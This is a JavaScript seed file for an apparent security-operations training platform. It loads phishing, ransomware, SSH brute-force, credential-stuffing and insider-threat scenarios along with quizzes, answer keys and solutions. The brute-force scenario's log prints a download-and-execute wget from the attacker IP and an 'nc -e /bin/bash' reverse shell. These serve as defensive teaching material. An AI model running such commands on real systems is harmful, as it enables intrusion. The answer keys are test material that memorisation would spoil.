const { db } = require('./database');

const scenarios = [
  {
    title: 'Suspicious Email Analysis',
    description: 'A user reported receiving a suspicious email. Analyze the email headers and content to determine if it is a phishing attempt.',
    category: 'phishing',
    difficulty: 'beginner',
    estimated_time: 15,
    points: 100,
    content: JSON.stringify({
      email: {
        from: 'security@amaz0n-security.com',
        to: 'user@company.com',
        subject: 'Urgent: Your Account Has Been Compromised',
        date: '2024-01-15 09:23:45',
        headers: {
          'Received': 'from mail.amaz0n-security.com (192.168.1.100) by mail.company.com',
          'Reply-To': 'support@amaz0n-sec.com',
          'X-Mailer': 'PHPMailer 6.1.5',
          'SPF': 'fail',
          'DKIM': 'fail',
          'DMARC': 'fail'
        },
        body: `Dear Valued Customer,

We have detected unusual activity on your account. Your account will be suspended within 24 hours unless you verify your information.

Click here to verify: http://amaz0n-sec.com/verify-account

Best regards,
Amazon Security Team`
      },
      logs: [
        { timestamp: '2024-01-15 09:23:45', source: 'email_gateway', event: 'Email received from external domain', severity: 'info' },
        { timestamp: '2024-01-15 09:23:46', source: 'spam_filter', event: 'Email flagged - suspicious sender domain', severity: 'warning' }
      ]
    }),
    solution: JSON.stringify({
      is_phishing: true,
      indicators: [
        'Domain typo: amaz0n-security.com vs amazon.com',
        'Reply-To header mismatch',
        'SPF/DKIM/DMARC failures',
        'Urgency tactic in subject line',
        'Suspicious link URL',
        'Generic greeting'
      ],
      correct_action: 'quarantine_and_alert'
    }),
    hints: JSON.stringify([
      'Check the sender domain carefully - look for typos',
      'Verify email authentication results (SPF, DKIM, DMARC)',
      'Analyze the Reply-To header',
      'Look for urgency tactics and suspicious links'
    ])
  },
  {
    title: 'Ransomware Detection',
    description: 'Multiple users reported files with strange extensions. Investigate the endpoint logs to identify the ransomware strain and patient zero.',
    category: 'malware',
    difficulty: 'intermediate',
    estimated_time: 25,
    points: 150,
    content: JSON.stringify({
      alerts: [
        { id: 'ALERT-001', timestamp: '2024-01-20 14:30:15', source: 'EDR-Workstation-42', severity: 'critical', description: 'Mass file modification detected' },
        { id: 'ALERT-002', timestamp: '2024-01-20 14:30:20', source: 'EDR-Workstation-42', severity: 'critical', description: 'Suspicious process encryption activity' },
        { id: 'ALERT-003', timestamp: '2024-01-20 14:31:00', source: 'Network-IDS', severity: 'high', description: 'C2 communication detected' }
      ],
      endpoint_logs: [
        { timestamp: '2024-01-20 14:28:00', process: 'outlook.exe', user: 'john.smith', action: 'Email opened', details: 'Subject: Invoice #2847' },
        { timestamp: '2024-01-20 14:28:30', process: 'winword.exe', user: 'john.smith', action: 'Document opened', details: 'Invoice_2847.docm' },
        { timestamp: '2024-01-20 14:29:00', process: 'powershell.exe', user: 'john.smith', action: 'Process started', details: 'Command: -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==' },
        { timestamp: '2024-01-20 14:30:15', process: 'unknown.exe', user: 'john.smith', action: 'Process started', details: 'Path: C:\\Users\\john.smith\\AppData\\Local\\Temp\\unknown.exe' },
        { timestamp: '2024-01-20 14:30:15', process: 'unknown.exe', user: 'john.smith', action: 'File modified', details: 'Pattern: *.encrypted' },
        { timestamp: '2024-01-20 14:31:00', process: 'unknown.exe', user: 'john.smith', action: 'Network connection', details: 'Destination: 185.220.101.42:443' }
      ],
      network_logs: [
        { timestamp: '2024-01-20 14:31:00', src_ip: '10.0.1.42', dst_ip: '185.220.101.42', port: 443, protocol: 'HTTPS', bytes: 2048 },
        { timestamp: '2024-01-20 14:31:30', src_ip: '10.0.1.42', dst_ip: '185.220.101.42', port: 443, protocol: 'HTTPS', bytes: 4096 }
      ],
      affected_files: [
        'document1.docx.encrypted',
        'spreadsheet.xlsx.encrypted',
        'presentation.pptx.encrypted',
        'budget_2024.xlsx.encrypted'
      ]
    }),
    solution: JSON.stringify({
      ransomware_type: 'Unknown strain (likely new variant)',
      patient_zero: 'john.smith (Workstation-42)',
      initial_vector: 'Malicious macro in Invoice_2847.docm',
      c2_server: '185.220.101.42',
      containment_steps: [
        'Isolate Workstation-42 from network immediately',
        'Block C2 IP 185.220.101.42 at firewall',
        'Disable john.smith account temporarily',
        'Check for lateral movement to other systems',
        'Restore files from backup'
      ]
    }),
    hints: JSON.stringify([
      'Look for the first malicious process execution',
      'Trace back from encryption activity to initial infection',
      'Check email and document access before the incident',
      'Identify the command and control server'
    ])
  },
  {
    title: 'Network Intrusion Detection',
    description: 'The IDS detected suspicious network traffic. Analyze the PCAP data to identify the attack type and affected systems.',
    category: 'network',
    difficulty: 'advanced',
    estimated_time: 30,
    points: 200,
    content: JSON.stringify({
      ids_alert: {
        id: 'IDS-2024-0115-001',
        timestamp: '2024-01-15 03:45:22',
        severity: 'high',
        signature: 'ET SCAN Potential SSH Brute Force',
        source_ip: '203.0.113.50',
        destination_ip: '10.0.1.10',
        port: 22
      },
      traffic_summary: [
        { time: '03:40:00', src: '203.0.113.50', dst: '10.0.1.10', port: 22, packets: 50, bytes: 3200, flags: 'SYN' },
        { time: '03:41:00', src: '203.0.113.50', dst: '10.0.1.10', port: 22, packets: 150, bytes: 9600, flags: 'SYN' },
        { time: '03:42:00', src: '203.0.113.50', dst: '10.0.1.10', port: 22, packets: 300, bytes: 19200, flags: 'SYN' },
        { time: '03:43:00', src: '203.0.113.50', dst: '10.0.1.10', port: 22, packets: 500, bytes: 32000, flags: 'SYN' },
        { time: '03:44:00', src: '203.0.113.50', dst: '10.0.1.10', port: 22, packets: 800, bytes: 51200, flags: 'SYN' },
        { time: '03:45:00', src: '203.0.113.50', dst: '10.0.1.10', port: 22, packets: 1000, bytes: 64000, flags: 'SYN' },
        { time: '03:45:30', src: '203.0.113.50', dst: '10.0.1.10', port: 22, packets: 10, bytes: 1500, flags: 'SYN,ACK' },
        { time: '03:46:00', src: '203.0.113.50', dst: '10.0.1.10', port: 22, packets: 200, bytes: 45000, flags: 'PSH,ACK' }
      ],
      authentication_logs: [
        { timestamp: '03:45:35', user: 'root', source_ip: '203.0.113.50', result: 'failed', method: 'password' },
        { timestamp: '03:45:36', user: 'admin', source_ip: '203.0.113.50', result: 'failed', method: 'password' },
        { timestamp: '03:45:37', user: 'user', source_ip: '203.0.113.50', result: 'failed', method: 'password' },
        { timestamp: '03:45:38', user: 'test', source_ip: '203.0.113.50', result: 'failed', method: 'password' },
        { timestamp: '03:45:45', user: 'root', source_ip: '203.0.113.50', result: 'success', method: 'password' }
      ],
      post_compromise_activity: [
        { timestamp: '03:46:00', command: 'whoami', user: 'root' },
        { timestamp: '03:46:05', command: 'cat /etc/passwd', user: 'root' },
        { timestamp: '03:46:15', command: 'wget http://203.0.113.50/payload.sh -O /tmp/.hidden/payload.sh', user: 'root' },
        { timestamp: '03:46:30', command: 'chmod +x /tmp/.hidden/payload.sh && /tmp/.hidden/payload.sh', user: 'root' },
        { timestamp: '03:47:00', command: 'nc -e /bin/bash 203.0.113.50 4444', user: 'root' }
      ]
    }),
    solution: JSON.stringify({
      attack_type: 'SSH Brute Force followed by successful compromise',
      attacker_ip: '203.0.113.50',
      victim_system: '10.0.1.10 (SSH Server)',
      compromised_account: 'root',
      attack_timeline: [
        '03:40-03:45: Reconnaissance and brute force attempts',
        '03:45: Successful root login',
        '03:46: Privilege enumeration and payload download',
        '03:47: Reverse shell established'
      ],
      indicators: [
        'High volume of SYN packets to port 22',
        'Multiple failed authentication attempts',
        'Successful login after brute force',
        'Suspicious wget command',
        'Reverse shell connection'
      ],
      mitigation: [
        'Block attacker IP 203.0.113.50',
        'Disable root SSH access',
        'Implement fail2ban',
        'Force password reset for root',
        'Check for persistence mechanisms'
      ]
    }),
    hints: JSON.stringify([
      'Analyze the traffic pattern - look for the spike in SYN packets',
      'Check authentication logs for successful login after many failures',
      'Review post-login activity for suspicious commands',
      'Identify any outbound connections or downloads'
    ])
  },
  {
    title: 'Credential Stuffing Attack',
    description: 'The web application firewall flagged unusual login activity. Investigate to determine if this is a credential stuffing attack.',
    category: 'web',
    difficulty: 'intermediate',
    estimated_time: 20,
    points: 125,
    content: JSON.stringify({
      waf_alert: {
        id: 'WAF-2024-0120-089',
        timestamp: '2024-01-20 08:15:00',
        rule: 'Rate Limit Exceeded - Login Endpoint',
        source_ip: '198.51.100.25',
        action: 'alert'
      },
      login_attempts: [
        { time: '08:00:01', username: 'admin@company.com', ip: '198.51.100.25', result: 'failed', user_agent: 'Mozilla/5.0 (compatible; Bot/1.0)' },
        { time: '08:00:02', username: 'john.doe@company.com', ip: '198.51.100.25', result: 'failed', user_agent: 'Mozilla/5.0 (compatible; Bot/1.0)' },
        { time: '08:00:03', username: 'jane.smith@company.com', ip: '198.51.100.25', result: 'failed', user_agent: 'Mozilla/5.0 (compatible; Bot/1.0)' },
        { time: '08:00:04', username: 'mike.wilson@company.com', ip: '198.51.100.25', result: 'failed', user_agent: 'Mozilla/5.0 (compatible; Bot/1.0)' },
        { time: '08:00:05', username: 'sarah.jones@company.com', ip: '198.51.100.25', result: 'failed', user_agent: 'Mozilla/5.0 (compatible; Bot/1.0)' },
        { time: '08:00:06', username: 'david.brown@company.com', ip: '198.51.100.25', result: 'success', user_agent: 'Mozilla/5.0 (compatible; Bot/1.0)' },
        { time: '08:00:07', username: 'lisa.davis@company.com', ip: '198.51.100.25', result: 'failed', user_agent: 'Mozilla/5.0 (compatible; Bot/1.0)' },
        { time: '08:00:08', username: 'robert.taylor@company.com', ip: '198.51.100.25', result: 'failed', user_agent: 'Mozilla/5.0 (compatible; Bot/1.0)' }
      ],
      successful_login_activity: [
        { time: '08:00:06', action: 'Login successful', details: 'david.brown@company.com from 198.51.100.25' },
        { time: '08:00:10', action: 'Profile accessed', details: 'User viewed account settings' },
        { time: '08:00:15', action: 'Data export initiated', details: 'Customer database export requested' },
        { time: '08:00:20', action: 'API key generated', details: 'New API key created for account' }
      ],
      geo_ip: {
        source_ip: '198.51.100.25',
        country: 'Unknown',
        city: 'Unknown',
        isp: 'Suspicious Hosting Provider',
        is_vpn: true,
        is_tor: false
      }
    }),
    solution: JSON.stringify({
      attack_type: 'Credential Stuffing Attack',
      attacker_ip: '198.51.100.25',
      compromised_account: 'david.brown@company.com',
      attack_characteristics: [
        'High velocity login attempts (1 per second)',
        'Automated user agent string',
        'Multiple different usernames',
        'VPN/proxy usage',
        'One successful login among many failures'
      ],
      immediate_actions: [
        'Block IP 198.51.100.25 at WAF',
        'Disable david.brown@company.com account',
        'Reset password for compromised account',
        'Revoke newly created API key',
        'Check for data exfiltration'
      ],
      preventive_measures: [
        'Implement CAPTCHA on login',
        'Enable MFA for all accounts',
        'Deploy rate limiting per username',
        'Monitor for impossible travel',
        'Implement breach password detection'
      ]
    }),
    hints: JSON.stringify([
      'Look at the pattern of login attempts - different usernames, same IP',
      'Check the user agent for automation indicators',
      'Analyze the successful login activity for suspicious actions',
      'Consider the geolocation and VPN usage'
    ])
  },
  {
    title: 'Insider Threat Investigation',
    description: 'HR reported an employee who gave notice and has been accessing unusual amounts of data. Investigate for potential data exfiltration.',
    category: 'insider',
    difficulty: 'advanced',
    estimated_time: 35,
    points: 175,
    content: JSON.stringify({
      employee_info: {
        name: 'Alex Chen',
        department: 'Engineering',
        role: 'Senior Database Administrator',
        notice_date: '2024-01-10',
        last_day: '2024-01-24'
      },
      dlp_alerts: [
        { timestamp: '2024-01-15 09:00:00', severity: 'high', description: 'Large database query executed', details: 'SELECT * FROM customers' },
        { timestamp: '2024-01-15 09:05:00', severity: 'high', description: 'Bulk data export detected', details: '5000+ records exported to CSV' },
        { timestamp: '2024-01-15 14:30:00', severity: 'medium', description: 'USB device connected', details: 'Device: SanDisk 64GB' },
        { timestamp: '2024-01-16 10:00:00', severity: 'high', description: 'Cloud storage upload', details: 'Uploaded customer_export.csv to personal Dropbox' }
      ],
      access_logs: [
        { timestamp: '2024-01-15 08:55:00', resource: 'Customer Database', action: 'Connect', result: 'success' },
        { timestamp: '2024-01-15 09:00:00', resource: 'Customer Database', action: 'Query', result: 'success', query: 'SELECT * FROM customers WHERE active=1' },
        { timestamp: '2024-01-15 09:02:00', resource: 'Customer Database', action: 'Query', result: 'success', query: 'SELECT * FROM orders' },
        { timestamp: '2024-01-15 09:05:00', resource: 'Export Tool', action: 'Export', result: 'success', details: 'Exported to C:\\Temp\\export.csv' },
        { timestamp: '2024-01-15 14:30:00', resource: 'USB Drive', action: 'Write', result: 'success', details: 'Copied export.csv to USB' },
        { timestamp: '2024-01-16 10:00:00', resource: 'Dropbox.com', action: 'Upload', result: 'success', details: 'Uploaded customer_export.csv (45MB)' }
      ],
      baseline_comparison: {
        normal_daily_queries: 15,
        recent_daily_queries: 150,
        normal_data_accessed: '50 MB/day',
        recent_data_accessed: '2 GB/day',
        normal_after_hours_access: false,
        recent_after_hours_access: true
      }
    }),
    solution: JSON.stringify({
      threat_type: 'Insider Data Exfiltration',
      employee: 'Alex Chen',
      data_accessed: [
        'Complete customer database',
        'Order history',
        'Potentially other sensitive tables'
      ],
      exfiltration_methods: [
        'USB device (SanDisk 64GB)',
        'Personal cloud storage (Dropbox)'
      ],
      risk_indicators: [
        '10x increase in database queries',
        '40x increase in data access volume',
        'After-hours access pattern',
        'Resignation notice period',
        'Access to sensitive data beyond normal role'
      ],
      recommended_actions: [
        'Immediately suspend Alex Chen\'s access',
        'Forensic imaging of workstation',
        'Review USB device contents',
        'Contact Dropbox for data removal',
        'Legal review for potential prosecution',
        'Notify affected customers if required',
        'Review data classification and access controls'
      ]
    }),
    hints: JSON.stringify([
      'Compare recent activity against the employee\'s baseline',
      'Look for data export and external transfer activities',
      'Consider the timing relative to resignation notice',
      'Check for multiple exfiltration channels'
    ])
  }
];

const assessments = [
  {
    title: 'SOC Fundamentals Assessment',
    description: 'Test your knowledge of basic SOC operations, tools, and procedures.',
    category: 'fundamentals',
    passing_score: 70,
    time_limit: 30,
    points: 100,
    questions: JSON.stringify([
      {
        id: 1,
        type: 'multiple_choice',
        question: 'What does SIEM stand for?',
        options: [
          'Security Information and Event Management',
          'System Integrity and Event Monitoring',
          'Security Intelligence and Endpoint Management',
          'System Information and Event Monitoring'
        ],
        correct_answer: 0,
        points: 10
      },
      {
        id: 2,
        type: 'multiple_choice',
        question: 'Which of the following is NOT a common SIEM function?',
        options: [
          'Log collection and aggregation',
          'Real-time event correlation',
          'Software development',
          'Alert generation'
        ],
        correct_answer: 2,
        points: 10
      },
      {
        id: 3,
        type: 'multiple_choice',
        question: 'What is the primary purpose of an IOC (Indicator of Compromise)?',
        options: [
          'To encrypt sensitive data',
          'To identify potential security incidents',
          'To backup system files',
          'To authenticate users'
        ],
        correct_answer: 1,
        points: 10
      },
      {
        id: 4,
        type: 'multiple_choice',
        question: 'In the NIST Cybersecurity Framework, which phase involves taking action regarding a detected cybersecurity incident?',
        options: [
          'Identify',
          'Protect',
          'Detect',
          'Respond'
        ],
        correct_answer: 3,
        points: 10
      },
      {
        id: 5,
        type: 'multiple_choice',
        question: 'What is the correct order of incident response phases?',
        options: [
          'Containment → Identification → Eradication → Recovery → Lessons Learned',
          'Identification → Containment → Eradication → Recovery → Lessons Learned',
          'Recovery → Containment → Identification → Eradication → Lessons Learned',
          'Identification → Recovery → Containment → Eradication → Lessons Learned'
        ],
        correct_answer: 1,
        points: 10
      },
      {
        id: 6,
        type: 'multiple_choice',
        question: 'Which log source would be MOST helpful in detecting a brute force attack?',
        options: [
          'DNS logs',
          'Authentication logs',
          'DHCP logs',
          'Printer logs'
        ],
        correct_answer: 1,
        points: 10
      },
      {
        id: 7,
        type: 'multiple_choice',
        question: 'What does the term "dwell time" refer to in cybersecurity?',
        options: [
          'Time spent configuring security tools',
          'Time between initial compromise and detection',
          'Time required to patch vulnerabilities',
          'Time for backup completion'
        ],
        correct_answer: 1,
        points: 10
      },
      {
        id: 8,
        type: 'multiple_choice',
        question: 'Which of the following is a strong indicator of phishing?',
        options: [
          'Email from a known colleague',
          'Urgent request with suspicious links',
          'Meeting invitation from calendar',
          'Internal company newsletter'
        ],
        correct_answer: 1,
        points: 10
      },
      {
        id: 9,
        type: 'multiple_choice',
        question: 'What is the purpose of network segmentation in security?',
        options: [
          'To increase network speed',
          'To limit the spread of attacks',
          'To reduce hardware costs',
          'To simplify network management'
        ],
        correct_answer: 1,
        points: 10
      },
      {
        id: 10,
        type: 'multiple_choice',
        question: 'Which protocol is commonly used for secure remote access?',
        options: [
          'Telnet',
          'FTP',
          'SSH',
          'HTTP'
        ],
        correct_answer: 2,
        points: 10
      }
    ])
  },
  {
    title: 'Log Analysis Mastery',
    description: 'Demonstrate your ability to analyze various log types and identify security events.',
    category: 'log_analysis',
    passing_score: 75,
    time_limit: 45,
    points: 150,
    questions: JSON.stringify([
      {
        id: 1,
        type: 'multiple_choice',
        question: 'In a Windows Event Log, Event ID 4625 indicates:',
        options: [
          'Successful login',
          'Failed login attempt',
          'Account lockout',
          'Password change'
        ],
        correct_answer: 1,
        points: 15
      },
      {
        id: 2,
        type: 'multiple_choice',
        question: 'Which HTTP status code indicates a successful request?',
        options: [
          '404',
          '500',
          '200',
          '403'
        ],
        correct_answer: 2,
        points: 15
      },
      {
        id: 3,
        type: 'multiple_choice',
        question: 'In Apache access logs, what does the user agent string reveal?',
        options: [
          'Server configuration',
          'Client browser and operating system',
          'Database version',
          'Network topology'
        ],
        correct_answer: 1,
        points: 15
      },
      {
        id: 4,
        type: 'multiple_choice',
        question: 'What would you look for in DNS logs to identify DNS tunneling?',
        options: [
          'Short domain names',
          'High volume of queries to unusual domains with long subdomains',
          'Queries to popular websites',
          'A records only'
        ],
        correct_answer: 1,
        points: 15
      },
      {
        id: 5,
        type: 'multiple_choice',
        question: 'In firewall logs, what does "DROP" action mean?',
        options: [
          'Packet was allowed through',
          'Packet was blocked and no response sent',
          'Packet was logged only',
          'Packet was redirected'
        ],
        correct_answer: 1,
        points: 15
      },
      {
        id: 6,
        type: 'multiple_choice',
        question: 'Which field in an email header helps identify the true origin server?',
        options: [
          'Subject',
          'To',
          'Received',
          'CC'
        ],
        correct_answer: 2,
        points: 15
      },
      {
        id: 7,
        type: 'multiple_choice',
        question: 'In Linux authentication logs (/var/log/auth.log), what does "Failed password" indicate?',
        options: [
          'Successful sudo command',
          'SSH key authentication success',
          'Incorrect password entered',
          'Account created'
        ],
        correct_answer: 2,
        points: 15
      },
      {
        id: 8,
        type: 'multiple_choice',
        question: 'What is the significance of Event ID 4688 in Windows?',
        options: [
          'Process creation',
          'User logout',
          'File deletion',
          'Network connection'
        ],
        correct_answer: 0,
        points: 15
      },
      {
        id: 9,
        type: 'multiple_choice',
        question: 'In proxy logs, what pattern might indicate data exfiltration?',
        options: [
          'Small HTTP GET requests',
          'Large POST requests to external cloud storage',
          'DNS queries',
          'ICMP packets'
        ],
        correct_answer: 1,
        points: 15
      },
      {
        id: 10,
        type: 'multiple_choice',
        question: 'Which timestamp format is commonly used in syslog?',
        options: [
          'Unix epoch',
          'ISO 8601',
          'RFC 3339',
          'All of the above'
        ],
        correct_answer: 3,
        points: 15
      }
    ])
  }
];

function seedDatabase() {
  console.log('Seeding database with scenarios and assessments...');
  
  // Seed scenarios
  const scenarioStmt = db.prepare(`
    INSERT OR IGNORE INTO scenarios 
    (title, description, category, difficulty, estimated_time, points, content, solution, hints)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  scenarios.forEach(scenario => {
    scenarioStmt.run([
      scenario.title,
      scenario.description,
      scenario.category,
      scenario.difficulty,
      scenario.estimated_time,
      scenario.points,
      scenario.content,
      scenario.solution,
      scenario.hints
    ], (err) => {
      if (err) console.error('Error inserting scenario:', err);
    });
  });

  scenarioStmt.finalize();

  // Seed assessments
  const assessmentStmt = db.prepare(`
    INSERT OR IGNORE INTO assessments 
    (title, description, category, questions, passing_score, time_limit, points)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `);

  assessments.forEach(assessment => {
    assessmentStmt.run([
      assessment.title,
      assessment.description,
      assessment.category,
      assessment.questions,
      assessment.passing_score,
      assessment.time_limit,
      assessment.points
    ], (err) => {
      if (err) console.error('Error inserting assessment:', err);
    });
  });

  assessmentStmt.finalize();

  console.log('Database seeding completed');
}

module.exports = { seedDatabase };
